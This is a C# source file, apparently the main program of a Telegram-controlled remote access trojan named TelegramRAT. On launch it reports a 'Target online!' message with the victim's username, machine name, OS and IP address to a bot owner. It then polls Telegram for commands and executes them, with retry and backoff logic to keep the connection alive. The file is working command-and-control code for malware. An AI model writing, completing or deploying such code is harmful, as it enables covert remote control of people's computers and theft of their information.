using BotCommand = TelegramRAT.Commands.BotCommand;
using Telegram.Bot.Types.ReplyMarkups;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Utilities;
using TelegramRAT.Commands;
using System.Diagnostics;
using Telegram.Bot.Types;
using Telegram.Bot;
using System.Net;
using System.Threading;

namespace TelegramRAT;

public static class Program
{
    private static readonly string BotToken = "YOUR_TELEGRAM_BOT_TOKEN";
    private static readonly long? OwnerId = null;

    private static TelegramBotClient? _bot;
    private static List<BotCommand> _commands = new();
    private const int MaxRetryAttempts = 5;
    private const int PollingDelay = 1000;

    public static TelegramBotClient Bot => _bot ?? throw new InvalidOperationException("Bot client is not initialized.");
    public static List<BotCommand> Commands => _commands;

    public static async Task Main(string[] args)
    {
        if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
        {
            Console.WriteLine("Only one instance can be online at the same time!");
            return;
        }

        using var cts = new CancellationTokenSource();

        Console.CancelKeyPress += (_, eventArgs) =>
        {
            eventArgs.Cancel = true;
            cts.Cancel();
        };

        int attempt = 0;

        while (!cts.IsCancellationRequested)
        {
            ResetSharedResources();
            attempt++;

            try
            {
                await RunAsync(cts.Token);
                break;
            }
            catch (OperationCanceledException) when (cts.IsCancellationRequested)
            {
                break;
            }
            catch (Exception ex)
            {
                bool unrecoverable = IsUnrecoverable(ex);
                var backoff = attempt < MaxRetryAttempts && !unrecoverable
                    ? CalculateBackoffDelay(attempt)
                    : TimeSpan.Zero;

                if (OwnerId is long ownerId && ownerId != 0)
                {
                    var ownerMessage = new Message { Chat = new Chat { Id = ownerId } };
                    var retryStatus = BuildRetryStatusMessage(attempt, backoff, unrecoverable);
                    await ReportExceptionAsync(ownerMessage, ex, retryStatus);

                    if (unrecoverable)
                    {
                        await SendErrorAsync(ownerMessage, new Exception("Only one bot instance can be online at the same time."));
                    }
                    else if (attempt < MaxRetryAttempts)
                    {
                        await Bot.SendMessage(
                            ownerId,
                            $"Retrying in {backoff.TotalSeconds:F0} seconds... (next attempt {attempt + 1} of {MaxRetryAttempts})",
                            parseMode: ParseMode.Html
                        );
                    }
                }

                if (unrecoverable || attempt >= MaxRetryAttempts)
                {
                    break;
                }

                try
                {
                    await Task.Delay(backoff, cts.Token);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
            }
        }
    }

    private static async Task RunAsync(CancellationToken cancellationToken)
    {
        cancellationToken.ThrowIfCancellationRequested();

        var markup = new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Show All Commands"));

        var systemInfo = $"Target online!\n\nUsername: <b>{Environment.UserName}</b>\nPC name: <b>{Environment.MachineName}</b>\nOS: {Utils.GetWindowsVersion()}\n\nIP: {await Utils.GetIpAddressAsync()}";

        await Bot.SendMessage(
            OwnerId,
            systemInfo,
            ParseMode.Html,
            replyMarkup: markup
        );

        CommandRegistry.InitializeCommands(Commands);

        int offset = 0;

        while (!cancellationToken.IsCancellationRequested)
        {
            var updates = await Bot.GetUpdates(offset, cancellationToken: cancellationToken);
            if (updates.Any())
                offset = updates.Last().Id + 1;

            await UpdateWorkerAsync(updates);
            await Task.Delay(PollingDelay, cancellationToken);
        }
    }

    private static TimeSpan CalculateBackoffDelay(int attempt)
    {
        var delaySeconds = Math.Min(Math.Pow(2, attempt), 60);
        return TimeSpan.FromSeconds(delaySeconds);
    }

    private static string BuildRetryStatusMessage(int attempt, TimeSpan backoff, bool unrecoverable)
    {
        if (unrecoverable)
        {
            return $"Run attempt {attempt} failed with an unrecoverable error.";
        }

        return backoff == TimeSpan.Zero
            ? $"Run attempt {attempt} failed. No further retries will be attempted."
            : $"Run attempt {attempt} failed. Retrying in {backoff.TotalSeconds:F0} seconds.";
    }

    private static bool IsUnrecoverable(Exception exception)
        => exception.InnerException?.Message.Contains("Conflict: terminated by other getUpdates request") == true;

    private static void ResetSharedResources()
    {
        if (_bot is IDisposable disposable)
        {
            disposable.Dispose();
        }

        _bot = new TelegramBotClient(BotToken);
        _commands = new List<BotCommand>();
    }

    private static async Task UpdateWorkerAsync(IEnumerable<Update> updates)
    {
        foreach (var update in updates)
        {
            if (update.CallbackQuery is not null)
            {
                var callback = update.CallbackQuery;
                await Bot.AnswerCallbackQuery(callback.Id, "Callback received!");

                if (callback.Message.ReplyMarkup != null)
                {
                    await Bot.EditMessageReplyMarkup(
                        callback.Message.Chat.Id,
                        callback.Message.MessageId,
                        replyMarkup: null
                    );
                }

                if (callback.Data == "Show All Commands")
                {
                    var cmd = Commands.FirstOrDefault(c => c.Command == "commands");
                    if (cmd != null)
                        await cmd.Execute(new BotCommandModel { Message = callback.Message });
                }
                continue;
            }

            if (update.Message is null) continue;

            var model = BotCommandModel.FromMessage(update.Message, "/");
            if (model == null) continue;

            var command = Commands.FirstOrDefault(c => c.Command.Equals(model.Command, StringComparison.OrdinalIgnoreCase)) ??
                          Commands.FirstOrDefault(c => c.Aliases?.Contains(model.Command, StringComparer.OrdinalIgnoreCase) == true);

            if (command == null) continue;

            if (command.ValidateModel(model))
            {
                await command.Execute(model);
            }
            else
            {
                await Bot.SendMessage(
                    update.Message.Chat.Id,
                    $"This command requires arguments!\n\nTo get information about this command - type /help {model.Command}",
                    replyParameters: new ReplyParameters { MessageId = model.Message.MessageId },
                    parseMode: ParseMode.Html
                );
            }
        }
    }

    public static async Task SendErrorAsync(Message message, Exception ex, bool includeStackTrace = false, string? context = null)
    {
        var errorParts = new List<string>();

        if (!string.IsNullOrWhiteSpace(context))
        {
            errorParts.Add(WebUtility.HtmlEncode(context));
        }

        errorParts.Add(WebUtility.HtmlEncode(ex.Message));

        if (includeStackTrace && ex.StackTrace is not null)
        {
            errorParts.Add(WebUtility.HtmlEncode(ex.StackTrace));
        }

        var errorMessage = $"Error: {string.Join("\n", errorParts)}";

        var replyMarkup = message.ReplyMarkup == null
            ? new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString()))
            : null;

        await Bot.SendMessage(
            message.Chat.Id,
            errorMessage,
            parseMode: ParseMode.Html,
            replyMarkup: replyMarkup
        );
    }

    public static async Task ReportExceptionAsync(Message message, Exception exception, string? context = null)
    {
        #if DEBUG
            bool includeStackTrace = true;
        #else
            bool includeStackTrace = false;
        #endif
        await SendErrorAsync(message, exception, includeStackTrace, context);
    }

    public static async Task SendSuccessAsync(Message message, string successMessage)
        => await Bot.SendMessage(message.Chat.Id, successMessage, parseMode: ParseMode.Html, replyMarkup: new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString())));

    public static async Task SendInfoAsync(Message message, string infoMessage)
        => await Bot.SendMessage(message.Chat.Id, infoMessage, parseMode: ParseMode.Html, replyMarkup: new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Reply", message.MessageId.ToString())));
}
